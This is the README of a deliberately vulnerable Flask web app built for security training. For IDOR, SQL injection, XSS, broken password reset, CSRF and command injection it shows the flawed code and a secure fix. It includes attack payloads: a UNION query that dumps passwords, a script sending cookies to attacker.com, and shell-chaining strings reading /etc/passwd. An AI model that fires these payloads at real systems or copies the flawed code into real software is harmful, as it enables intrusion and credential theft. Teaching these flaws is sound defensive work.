# 🔓 hackminaaziz.fly.dev

> A deliberately vulnerable web application for Application Security (AppSec) training and education

[![Python](https://img.shields.io/badge/Python-3.13-blue.svg)](https://www.python.org/)
[![Flask](https://img.shields.io/badge/Flask-3.0.0-green.svg)](https://flask.palletsprojects.com/)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

**⚠️ WARNING: This application contains intentional security vulnerabilities. DO NOT use in production environments.**

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Vulnerabilities](#vulnerabilities)
- [Quick Start](#quick-start)
- [Deployment](#deployment)
- [Vulnerability Details & Remediations](#vulnerability-details--remediations)
- [Project Structure](#project-structure)
- [Contributing](#contributing)
- [License](#license)

---

## 🎯 Overview

**hackminaaziz.com** is a deliberately vulnerable Flask web application designed to help security professionals, developers, and students understand common web application vulnerabilities through hands-on practice.

This project demonstrates real-world security issues in a controlled, educational environment, making it perfect for:
- Security training workshops
- Penetration testing practice
- Secure coding education
- CTF (Capture The Flag) exercises
- Security awareness training

### 🎓 Learning Objectives

- Understand how common vulnerabilities work
- Practice identifying security flaws
- Learn proper remediation techniques
- Experience real-world attack scenarios
- Develop secure coding practices

---

## ✨ Features

- **7 Active Vulnerabilities** - Real, exploitable security flaws
- **Comprehensive Documentation** - Detailed guides for each vulnerability
- **Modern UI** - Clean, responsive design with mobile support
- **Interactive Learning** - Test vulnerabilities with provided payloads
- **Code Examples** - See vulnerable code and secure alternatives
- **Live Demo** - Deployed on [fly.io](https://hackminaaziz.fly.dev/)

---

## 🐛 Vulnerabilities

This application contains **7 intentional security vulnerabilities**:

| # | Vulnerability | Severity | Location | Status |
|---|--------------|----------|----------|--------|
| 1 | **IDOR** (Insecure Direct Object Reference) | 🔴 High | `/profile/<user_id>` | ✅ Active |
| 2 | **SQL Injection** | 🔴 Critical | `/comments`, `/profile` | ✅ Active |
| 3 | **Stored XSS** (Cross-Site Scripting) | 🔴 High | `/comments` | ✅ Active |
| 4 | **Reflected XSS** | 🟡 Medium | `/search` | ✅ Active |
| 5 | **Broken Password Reset** | 🔴 High | `/reset` | ✅ Active |
| 6 | **CSRF** (Cross-Site Request Forgery) | 🟡 Medium | `/comments` | ✅ Active |
| 7 | **Command Injection** | 🔴 Critical | `/ping` | ✅ Active |

---

## 🚀 Quick Start

### Prerequisites

- Python 3.13+
- pip (Python package manager)

### Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/hackminaaziz.git
cd hackminaaziz

# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt

# Run the application
python3 app.py
```

The application will be available at `http://localhost:8000`

### Sample Users

The database is pre-populated with these users:

- **ID 1:** `admin` / `supersecret`
- **ID 2:** `mina` / `password123`
- **ID 3:** `guest` / `guest`

---

## 🌐 Deployment

### Deploy to fly.io

```bash
# Install flyctl
brew install flyctl  # macOS
# Or download from: https://fly.io/docs/getting-started/installing-flyctl/

# Login
flyctl auth login

# Deploy
flyctl deploy
```

**Live Demo:** [https://hackminaaziz.fly.dev/](https://hackminaaziz.fly.dev/)

---

## 🔍 Vulnerability Details & Remediations

### 1. IDOR (Insecure Direct Object Reference)

#### Vulnerable Code

```python
@app.route('/profile/<user_id>')
def profile(user_id):
    conn = sqlite3.connect(get_db_path())
    c = conn.cursor()
    
    # VULNERABLE: No authorization check
    query = f"SELECT id, username, password FROM users WHERE id = {user_id}"
    result = c.execute(query).fetchone()
    
    return render_template('profile.html', user=user_data)
```

#### The Issue

- ❌ No authentication check
- ❌ No authorization check
- ❌ Direct object reference without validation
- ❌ Passwords exposed in plaintext
- ❌ Also vulnerable to SQL injection

#### Remediation

```python
@app.route('/profile/<user_id>')
def profile(user_id):
    # 1. CHECK AUTHENTICATION
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    # 2. VALIDATE INPUT
    try:
        user_id = int(user_id)
    except ValueError:
        return "Invalid user ID", 400
    
    # 3. CHECK AUTHORIZATION
    logged_in_user_id = session.get('user_id')
    if logged_in_user_id != user_id:
        return "Unauthorized", 403
    
    # 4. USE PARAMETERIZED QUERIES
    conn = sqlite3.connect(get_db_path())
    c = conn.cursor()
    c.execute("SELECT id, username FROM users WHERE id = ?", (user_id,))
    result = c.fetchone()
    
    # 5. DON'T EXPOSE SENSITIVE DATA
    user_data = {
        "id": result[0],
        "username": result[1]
        # Password NOT included
    }
    
    return render_template('profile.html', user=user_data)
```

**Key Fixes:**
- ✅ Authentication check
- ✅ Authorization check (users can only view own profile)
- ✅ Input validation
- ✅ Parameterized queries
- ✅ Don't expose passwords

---

### 2. SQL Injection

#### Vulnerable Code

```python
@app.route('/comments', methods=['GET', 'POST'])
def comments():
    search_term = request.args.get('search', '')
    
    # VULNERABLE: Direct string concatenation
    query = f"SELECT username, comment FROM comments WHERE comment LIKE '%{search_term}%'"
    c.execute(query)
    results = c.fetchall()
```

#### The Issue

- ❌ Direct string concatenation in SQL queries
- ❌ No parameterized queries
- ❌ No input validation
- ❌ Database errors exposed to users

#### Attack Payload

```sql
' UNION SELECT username, password FROM users --
```

#### Remediation

```python
@app.route('/comments', methods=['GET', 'POST'])
def comments():
    search_term = request.args.get('search', '')
    
    # 1. VALIDATE INPUT
    if len(search_term) > 100:
        return "Search term too long", 400
    
    # 2. USE PARAMETERIZED QUERIES
    conn = sqlite3.connect(get_db_path())
    c = conn.cursor()
    
    if search_term:
        c.execute(
            "SELECT username, comment FROM comments WHERE comment LIKE ?",
            (f'%{search_term}%',)
        )
    else:
        c.execute("SELECT username, comment FROM comments")
    
    results = c.fetchall()
    conn.close()
    
    return render_template('comments.html', results=results)
```

**Key Fixes:**
- ✅ Parameterized queries with `?` placeholders
- ✅ Input validation (length checks)
- ✅ Proper error handling
- ✅ No string concatenation

---

### 3. Stored XSS (Cross-Site Scripting)

#### Vulnerable Code

**Backend:**
```python
# User input stored directly without sanitization
query = f"INSERT INTO comments (username, comment) VALUES ('{username}', '{comment}')"
c.execute(query)
```

**Frontend:**
```html
<!-- VULNERABLE: |safe filter disables HTML escaping -->
<td>{{ row[0] | safe }}</td>
<td>{{ row[1] | safe }}</td>
```

#### The Issue

- ❌ No input sanitization
- ❌ `|safe` filter disables HTML escaping
- ❌ Malicious scripts persist in database
- ❌ Executes for all visitors

#### Attack Payload

```html
<img src=x onerror="alert('XSS')">
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
```

#### Remediation

**Backend:**
```python
from markupsafe import escape

@app.route('/comments', methods=['POST'])
def comments():
    username = request.form.get('username', '')
    comment = request.form.get('comment', '')
    
    # 1. SANITIZE INPUT
    username = escape(username)
    comment = escape(comment)
    
    # 2. STORE SANITIZED DATA
    c.execute(
        "INSERT INTO comments (username, comment) VALUES (?, ?)",
        (username, comment)
    )
```

**Frontend:**
```html
<!-- REMOVE |safe filter - let Jinja2 auto-escape -->
<td>{{ row[0] }}</td>
<td>{{ row[1] }}</td>
```

**Additional Security:**
```python
@app.after_request
def set_security_headers(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline';"
    )
    return response
```

**Key Fixes:**
- ✅ Remove `|safe` filter
- ✅ Escape user input (`markupsafe.escape()`)
- ✅ Content Security Policy headers
- ✅ Input validation

---

### 4. Reflected XSS

#### Vulnerable Code

```python
@app.route('/search')
def search():
    query = request.args.get("q", "")
    return render_template('search.html', query=query)
```

```html
<!-- VULNERABLE: |safe filter -->
<p>You searched for: {{ query|safe }}</p>
```

#### The Issue

- ❌ Query parameter not sanitized
- ❌ `|safe` filter disables escaping
- ❌ Immediate execution in URL
- ❌ Perfect for phishing attacks

#### Attack Payload

```
/search?q=<script>alert('XSS')</script>
```

#### Remediation

```python
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get("q", "")
    
    # 1. VALIDATE AND SANITIZE
    if len(query) > 200:
        query = query[:200]
    
    query = escape(query)
    return render_template('search.html', query=query)
```

```html
<!-- REMOVE |safe filter -->
<p>You searched for: {{ query }}</p>
```

**Key Fixes:**
- ✅ Remove `|safe` filter
- ✅ Escape user input
- ✅ Input validation
- ✅ CSP headers

---

### 5. Broken Password Reset

#### Vulnerable Code

```python
@app.route('/reset', methods=['POST'])
def reset():
    username = request.form.get('username', '')
    
    # VULNERABLE: Predictable token
    token = f"RESET-{username}-1234"
    reset_link = url_for("reset_confirm", token=token, _external=True)
```

```python
@app.route('/reset/confirm', methods=['GET'])
def reset_confirm():
    token = request.args.get('token', '')
    
    # VULNERABLE: No validation, no database lookup
    if token.startswith("RESET-") and token.endswith("-1234"):
        username = token.replace("RESET-", "").replace("-1234", "")
        # Accepts any matching token
```

#### The Issue

- ❌ Predictable token format: `RESET-{username}-1234`
- ❌ No token storage in database
- ❌ No expiration check
- ❌ No one-time use enforcement
- ❌ SQL injection in password update

#### Remediation

```python
import secrets
import hashlib
from datetime import datetime, timedelta

@app.route('/reset', methods=['POST'])
def reset():
    username = request.form.get('username', '')
    
    # 1. VERIFY USER EXISTS
    c.execute("SELECT id FROM users WHERE username = ?", (username,))
    user = c.fetchone()
    if not user:
        return "If user exists, reset link sent"  # Don't reveal if user exists
    
    # 2. GENERATE SECURE TOKEN
    token = secrets.token_urlsafe(32)  # 43 characters, cryptographically secure
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    
    # 3. STORE TOKEN IN DATABASE
    expires_at = datetime.now() + timedelta(hours=1)
    c.execute("""
        INSERT INTO reset_tokens (user_id, token_hash, expires_at, used)
        VALUES (?, ?, ?, 0)
    """, (user[0], token_hash, expires_at))
    
    # 4. SEND TOKEN VIA EMAIL (not shown in response)
    # send_reset_email(username, token)
```

```python
@app.route('/reset/confirm', methods=['GET', 'POST'])
def reset_confirm():
    token = request.args.get('token', '')
    
    # 1. HASH TOKEN
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    
    # 2. LOOKUP IN DATABASE
    c.execute("""
        SELECT rt.user_id, rt.expires_at, rt.used
        FROM reset_tokens rt
        WHERE rt.token_hash = ? AND rt.used = 0
    """, (token_hash,))
    
    result = c.fetchone()
    if not result:
        return "Invalid token", 400
    
    # 3. CHECK EXPIRATION
    if datetime.now() > datetime.fromisoformat(result[1]):
        return "Token expired", 400
    
    # 4. CHECK IF USED
    if result[2]:
        return "Token already used", 400
    
    # 5. UPDATE PASSWORD WITH PARAMETERIZED QUERY
    new_password = request.form.get('new_password', '')
    password_hash = hashlib.sha256(new_password.encode()).hexdigest()
    
    c.execute("UPDATE users SET password = ? WHERE id = ?", 
              (password_hash, result[0]))
    
    # 6. MARK TOKEN AS USED
    c.execute("UPDATE reset_tokens SET used = 1 WHERE token_hash = ?", 
              (token_hash,))
```

**Key Fixes:**
- ✅ Cryptographically secure tokens (`secrets.token_urlsafe()`)
- ✅ Token storage in database
- ✅ Expiration checks (1 hour)
- ✅ One-time use enforcement
- ✅ Parameterized queries
- ✅ Password hashing

---

### 6. CSRF (Cross-Site Request Forgery)

#### Vulnerable Code

```html
<!-- VULNERABLE: Hardcoded fake token -->
<form method="POST" action="{{ url_for('comments') }}">
    <input type="hidden" name="csrf_token" value="HARDCODED-DEMO-TOKEN">
    <!-- Backend doesn't validate this token -->
</form>
```

```python
@app.route('/comments', methods=['POST'])
def comments():
    # No CSRF token validation
    username = request.form.get('username', '')
    comment = request.form.get('comment', '')
    # Process without checking token
```

#### The Issue

- ❌ Fake CSRF token (hardcoded)
- ❌ No server-side validation
- ❌ No Same-Origin check
- ❌ Malicious sites can submit forms

#### Remediation

```python
import secrets

def generate_csrf_token():
    """Generate CSRF token for session"""
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_urlsafe(32)
    return session['csrf_token']

def validate_csrf_token(token):
    """Validate CSRF token"""
    return token and token == session.get('csrf_token')

@app.route('/comments', methods=['POST'])
def comments():
    # 1. VALIDATE CSRF TOKEN
    csrf_token = request.form.get('csrf_token')
    if not validate_csrf_token(csrf_token):
        return "Invalid CSRF token", 403
    
    username = request.form.get('username', '')
    comment = request.form.get('comment', '')
    # Process comment...
```

**Alternative: Using Flask-WTF**

```python
from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField, TextAreaField
from wtforms.validators import DataRequired

csrf = CSRFProtect(app)

class CommentForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired()])
    comment = TextAreaField('Comment', validators=[DataRequired()])

@app.route('/comments', methods=['GET', 'POST'])
def comments():
    form = CommentForm()
    
    if form.validate_on_submit():  # CSRF automatically validated
        username = form.username.data
        comment = form.comment.data
        # Process comment...
```

**Additional Security:**
```python
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS only
app.config['SESSION_COOKIE_HTTPONLY'] = True
```

**Key Fixes:**
- ✅ Generate unique tokens per session
- ✅ Validate tokens on server-side
- ✅ Use Flask-WTF for built-in protection
- ✅ SameSite cookie attribute
- ✅ Secure cookie settings

---

### 7. Command Injection

#### Vulnerable Code

```python
import subprocess

@app.route('/ping', methods=['POST'])
def ping():
    host = request.form.get('host', '')
    
    # VULNERABLE: shell=True + string concatenation
    cmd = f"ping -c 2 {host}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    output = result.stdout
```

#### The Issue

- ❌ `shell=True` allows command chaining
- ❌ Direct string concatenation
- ❌ No input validation
- ❌ Can execute arbitrary OS commands

#### Attack Payloads

```bash
google.com; ls
google.com && cat /etc/passwd
google.com || whoami
google.com; $(id)
```

#### Remediation

**Option 1: Use Library (Recommended)**

```python
# Install: pip install ping3
from ping3 import ping

@app.route('/ping', methods=['POST'])
def ping():
    host = request.form.get('host', '')
    
    # 1. VALIDATE HOSTNAME FORMAT
    import re
    if not re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$', host):
        return "Invalid hostname", 400
    
    # 2. USE LIBRARY INSTEAD OF SHELL
    result = ping(host, timeout=2)
    if result is not None:
        output = f"Host {host} is reachable"
    else:
        output = f"Host {host} is not reachable"
```

**Option 2: If Shell is Necessary**

```python
import subprocess
import shlex

@app.route('/ping', methods=['POST'])
def ping():
    host = request.form.get('host', '')
    
    # 1. VALIDATE INPUT
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host) or len(host) > 253:
        return "Invalid hostname", 400
    
    # 2. USE subprocess WITHOUT shell=True
    # 3. BUILD COMMAND AS LIST (not string)
    cmd = ['ping', '-c', '2', host]
    result = subprocess.run(
        cmd,
        shell=False,  # Don't use shell
        capture_output=True,
        text=True,
        timeout=5
    )
    output = result.stdout
```

**Key Fixes:**
- ✅ Avoid `shell=True` when possible
- ✅ Use libraries instead of shell commands
- ✅ Input validation (whitelist characters)
- ✅ Use list arguments (not strings)
- ✅ Run with minimal privileges

---

## 📁 Project Structure

```
hackminaaziz/
├── app.py                 # Main Flask application
├── config.py             # Configuration (weak secrets)
├── db.sqlite3            # SQLite database
├── requirements.txt      # Python dependencies
├── Dockerfile           # Docker configuration
├── fly.toml             # Fly.io deployment config
├── README.md            # This file
├── VULNERABILITY_GUIDE.md # Detailed vulnerability guide
├── templates/           # HTML templates
│   ├── layout.html
│   ├── index.html
│   ├── login.html
│   ├── register.html
│   ├── profile.html     # IDOR vulnerability
│   ├── reset.html       # Broken password reset
│   ├── reset_confirm.html
│   ├── search.html      # Reflected XSS
│   ├── comments.html    # SQL Injection + Stored XSS
│   ├── csrf_demo.html   # CSRF demonstration
│   ├── ping.html        # Command injection
│   └── about.html
├── static/
│   ├── css/
│   │   └── styles.css   # Modern dark theme
│   └── js/
│       └── script.js   # Mobile menu & interactions
└── utils/
    ├── db_utils.py      # Database utilities (placeholder)
    └── cloud.py         # AWS utilities (placeholder)
```

---

## 🧪 Testing Vulnerabilities

### IDOR
```
Visit: /profile/1
Then try: /profile/2 or /profile/3
```

### SQL Injection
```
In Comments search: ' UNION SELECT username, password FROM users --
```

### Reflected XSS
```
Visit: /search?q=<script>alert('XSS')</script>
```

### Stored XSS
```
Submit comment: <img src=x onerror="alert('XSS')">
```

### Broken Password Reset
```
Craft token: RESET-admin-1234
Visit: /reset/confirm?token=RESET-admin-1234
```

### CSRF
```
Visit: /comments/csrf-demo
(Form auto-submits to /comments)
```

### Command Injection
```
In Ping: google.com; ls
```

---

## 📚 Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Flask Security Best Practices](https://flask.palletsprojects.com/en/latest/security/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

## 🤝 Contributing

Contributions are welcome! This is an educational project, so feel free to:
- Add more vulnerabilities
- Improve documentation
- Enhance the UI
- Add more remediation examples
- Report issues

---

## ⚠️ Disclaimer

This application is **intentionally insecure** and is designed **solely for educational purposes**. 

- ❌ **DO NOT** use in production
- ❌ **DO NOT** deploy to public networks without proper isolation
- ❌ **DO NOT** use real credentials or sensitive data
- ✅ **DO** use in controlled, isolated environments
- ✅ **DO** use for security training and education
- ✅ **DO** use for learning secure coding practices

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 👤 Author

**Mina Aziz**

- GitHub: [@yourusername](https://github.com/yourusername)
- Website: [hackminaaziz.com](https://hackminaaziz.fly.dev/)

---

## 🙏 Acknowledgments

- Inspired by [DVWA](https://github.com/digininja/DVWA) and [WebGoat](https://owasp.org/www-project-webgoat/)
- Built with [Flask](https://flask.palletsprojects.com/)
- Deployed on [fly.io](https://fly.io/)

---

**⭐ If you find this project useful, please give it a star!**
